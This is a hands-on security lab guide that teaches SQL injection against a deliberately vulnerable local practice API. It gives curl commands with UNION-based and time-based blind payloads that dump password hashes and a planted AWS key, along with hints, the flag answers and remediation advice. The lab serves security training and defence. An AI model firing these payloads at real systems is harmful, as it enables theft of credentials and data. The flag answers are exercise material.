# Lab 08: SQL Injection via Search Endpoint

## Objective

Discover and exploit SQL injection vulnerabilities in the SocialHack API's user search endpoint to extract sensitive data including password hashes, admin credentials, and internal secrets.

## Metadata

| Field | Value |
|---|---|
| **Difficulty** | Medium-Hard |
| **Estimated Time** | 90 minutes |
| **Prerequisites** | Labs 01–07 completed, basic SQL knowledge, Python 3 with `requests` |
| **OWASP API Category** | API8:2023 – Security Misconfiguration / Injection |

---

## Background

### What Is SQL Injection?

SQL Injection (SQLi) occurs when user-supplied input is concatenated directly into SQL queries **without proper sanitization or parameterization**. This allows an attacker to modify the query's logic, extract unauthorized data, or even modify/delete database records.

### Types of SQL Injection

| Type | Description | Detection |
|---|---|---|
| **Error-based** | Database error messages reveal information | Send `'` and look for SQL errors |
| **UNION-based** | Append `UNION SELECT` to extract data from other tables | Requires matching column count |
| **Boolean-based blind** | True/false responses differ based on injected conditions | Compare response for `' AND 1=1--` vs `' AND 1=2--` |
| **Time-based blind** | Use `SLEEP()` or `WAITFOR DELAY` to infer data | Response time changes |

### Vulnerable Code Pattern

```python
# VULNERABLE — string concatenation
query = f"SELECT * FROM users WHERE username LIKE '%{search_term}%'"
cursor.execute(query)

# SAFE — parameterized query
query = "SELECT * FROM users WHERE username LIKE ?"
cursor.execute(query, (f"%{search_term}%",))
```

### UNION SELECT Requirements

For a UNION-based injection to work:
1. The number of columns in your UNION SELECT must match the original query
2. Data types should be compatible
3. You need to know (or guess) table and column names

---

## Lab Environment

| Item | Value |
|---|---|
| Target API | `http://localhost:5000` |
| Vulnerable Endpoint | `GET /api/v1/users/search?q=` |
| Database | SQLite (single file database) |
| Auth Required | Yes (any valid JWT) |

---

## Tasks

### Task 1: Detect SQL Injection

**Goal:** Confirm that the search endpoint is vulnerable to SQL injection.

**Steps:**

1. Login to get a valid JWT token:

```bash
TOKEN=$(curl -s -X POST http://localhost:5000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password123"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
```

2. Send a normal search request:

```bash
curl -s "http://localhost:5000/api/v1/users/search?q=alice" \
  -H "Authorization: Bearer $TOKEN"
```

3. Inject a single quote to trigger a SQL error:

```bash
curl -s "http://localhost:5000/api/v1/users/search?q='" \
  -H "Authorization: Bearer $TOKEN"
```

4. Examine the error message. Does it reveal the SQL query structure or database engine?

> **🚩 FLAG 1:** What is the SQL error message returned when injecting a single quote?

<details>
<summary>Hint 1 (Gentle Nudge)</summary>
SQL databases typically throw a syntax error when they receive an unmatched single quote. Look for keywords like "syntax error", "near", or the SQL query fragment in the response.
</details>

<details>
<summary>Hint 2 (Stronger Push)</summary>
The error message likely contains something like: <code>unrecognized token</code> or <code>near "'": syntax error</code>. This confirms the input is being embedded directly in SQL.
</details>

<details>
<summary>Hint 3 (Almost the Answer)</summary>
The error will contain the SQL engine's native error message, something like: <code>near "%'%": syntax error</code> — confirming string concatenation-based SQLi.
</details>

---

### Task 2: Determine Column Count

**Goal:** Figure out how many columns the original SELECT query returns (needed for UNION injection).

**Steps:**

1. Use `ORDER BY` with increasing column numbers to find the column count:

```bash
# Try ORDER BY 1 (should work)
curl -s "http://localhost:5000/api/v1/users/search?q=' ORDER BY 1--" \
  -H "Authorization: Bearer $TOKEN"

# Try ORDER BY 6 (might work)
curl -s "http://localhost:5000/api/v1/users/search?q=' ORDER BY 6--" \
  -H "Authorization: Bearer $TOKEN"

# Try ORDER BY 7 (should fail if only 6 columns)
curl -s "http://localhost:5000/api/v1/users/search?q=' ORDER BY 7--" \
  -H "Authorization: Bearer $TOKEN"
```

2. Alternatively, try UNION SELECT with increasing numbers of columns:

```bash
# Try 6 columns
curl -s "http://localhost:5000/api/v1/users/search?q=' UNION SELECT 1,2,3,4,5,6--" \
  -H "Authorization: Bearer $TOKEN"
```

<details>
<summary>Hint 1</summary>
Start with <code>ORDER BY 1</code> and increment until you get an error. The last number that works is the column count.
</details>

<details>
<summary>Hint 2</summary>
The users table likely has columns: id, username, email, password_hash, role, is_verified, and possibly more. Try UNION SELECT with 6-8 columns.
</details>

<details>
<summary>Hint 3</summary>
The query returns 6 columns. Use: <code>' UNION SELECT 1,2,3,4,5,6--</code>
</details>

---

### Task 3: Extract All Usernames and Password Hashes

**Goal:** Use UNION-based injection to dump all user data from the database.

**Steps:**

1. First, discover table names (SQLite uses `sqlite_master`):

```bash
curl -s "http://localhost:5000/api/v1/users/search?q=' UNION SELECT 1,name,type,sql,5,6 FROM sqlite_master WHERE type='table'--" \
  -H "Authorization: Bearer $TOKEN"
```

2. Extract all user data:

```bash
curl -s "http://localhost:5000/api/v1/users/search?q=' UNION SELECT id,username,email,password_hash,role,is_verified FROM users--" \
  -H "Authorization: Bearer $TOKEN"
```

3. Identify the admin user's password hash from the results.

> **🚩 FLAG 2:** What is the admin user's password hash?

<details>
<summary>Hint 1</summary>
The <code>users</code> table contains a <code>password_hash</code> column. Use it in your UNION SELECT.
</details>

<details>
<summary>Hint 2</summary>
The admin user has <code>id=4</code>. Look for their entry in the UNION SELECT results or filter with <code>WHERE id=4</code>.
</details>

<details>
<summary>Hint 3</summary>
Use: <code>' UNION SELECT id,username,email,password_hash,role,is_verified FROM users WHERE role='admin'--</code>
</details>

---

### Task 4: Extract Sensitive Internal Data

**Goal:** Access hidden columns containing secrets like AWS keys.

**Steps:**

1. First, enumerate all columns in the users table:

```bash
# Use sqlite_master to get the CREATE TABLE statement
curl -s "http://localhost:5000/api/v1/users/search?q=' UNION SELECT 1,sql,3,4,5,6 FROM sqlite_master WHERE name='users'--" \
  -H "Authorization: Bearer $TOKEN"
```

2. Look for columns like `internal_notes`, `secret`, etc. in the CREATE TABLE output.

3. Extract the `internal_notes` column:

```bash
curl -s "http://localhost:5000/api/v1/users/search?q=' UNION SELECT id,username,internal_notes,4,5,6 FROM users WHERE role='admin'--" \
  -H "Authorization: Bearer $TOKEN"
```

4. The admin's `internal_notes` should contain an AWS access key.

> **🚩 FLAG 3:** What is the AWS access key found in admin's internal_notes?

<details>
<summary>Hint 1</summary>
The <code>internal_notes</code> column stores private notes for each user. It's not normally exposed through the API but can be extracted via SQLi.
</details>

<details>
<summary>Hint 2</summary>
Target the admin user's internal_notes. AWS access keys start with <code>AKIA</code>.
</details>

<details>
<summary>Hint 3</summary>
The AWS access key is: <code>AKIA1234567890ABCDEF</code>
</details>

---

### Task 5: Time-Based Blind SQL Injection (Advanced / Optional)

**Goal:** Demonstrate data extraction when the application doesn't return query results directly.

**Steps:**

1. Test if time-based injection works (SQLite doesn't have `SLEEP()` but you can use a heavy query):

```bash
# This might not work in SQLite but demonstrates the concept
# For SQLite, a randomblob can create delays:
curl -s -o /dev/null -w "Response time: %{time_total}s\n" \
  "http://localhost:5000/api/v1/users/search?q=' AND (SELECT CASE WHEN (1=1) THEN randomblob(100000000) ELSE 1 END)--" \
  -H "Authorization: Bearer $TOKEN"
```

2. Compare with a false condition:

```bash
curl -s -o /dev/null -w "Response time: %{time_total}s\n" \
  "http://localhost:5000/api/v1/users/search?q=' AND (SELECT CASE WHEN (1=2) THEN randomblob(100000000) ELSE 1 END)--" \
  -H "Authorization: Bearer $TOKEN"
```

3. If there's a time difference, you can extract data character by character:

```bash
# Extract the first character of admin's password hash
# If it's 'a', the response will be delayed
curl -s -o /dev/null -w "Response time: %{time_total}s\n" \
  "http://localhost:5000/api/v1/users/search?q=' AND (SELECT CASE WHEN (substr((SELECT password_hash FROM users WHERE role='admin'),1,1)='a') THEN randomblob(100000000) ELSE 1 END)--" \
  -H "Authorization: Bearer $TOKEN"
```

---

## Flags Summary

| Flag | Description | Value |
|---|---|---|
| FLAG 1 | SQL error message from single quote injection | SQL syntax error message (varies) |
| FLAG 2 | Admin's password hash | (bcrypt/sha256 hash of `admin123`) |
| FLAG 3 | AWS access key from admin's internal_notes | `AKIA1234567890ABCDEF` |

---

## Remediation

### 1. Use Parameterized Queries (Prepared Statements)

```python
# SAFE — parameterized
cursor.execute(
    "SELECT * FROM users WHERE username LIKE ?",
    (f"%{search_term}%",)
)
```

### 2. Use an ORM Properly

```python
# SAFE — ORM with proper filtering
users = User.query.filter(User.username.ilike(f"%{search_term}%")).all()
```

### 3. Input Validation

```python
import re

def validate_search_query(q):
    # Allow only alphanumeric, spaces, and basic punctuation
    if not re.match(r'^[a-zA-Z0-9\s\-_.@]+$', q):
        abort(400, "Invalid search query")
    if len(q) > 100:
        abort(400, "Search query too long")
    return q
```

### 4. Principle of Least Privilege

- Database user should have only SELECT permission on specific columns
- Never store secrets (AWS keys) in the same database as user data
- Use column-level permissions where supported

### 5. Error Handling

```python
# Never expose raw SQL errors to clients
try:
    results = db.execute(query)
except Exception as e:
    app.logger.error(f"Database error: {e}")
    return jsonify({"error": "Search failed"}), 500  # Generic message
```

### 6. Web Application Firewall (WAF)

Deploy a WAF that blocks common SQL injection patterns:
- Single quotes in unexpected places
- UNION SELECT statements
- SQL keywords like `DROP`, `INSERT`, `UPDATE` in search fields
- Comment sequences (`--`, `/**/`)

---

## References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [SQLite SQL Injection Techniques](https://www.sqlite.org/lang_expr.html)
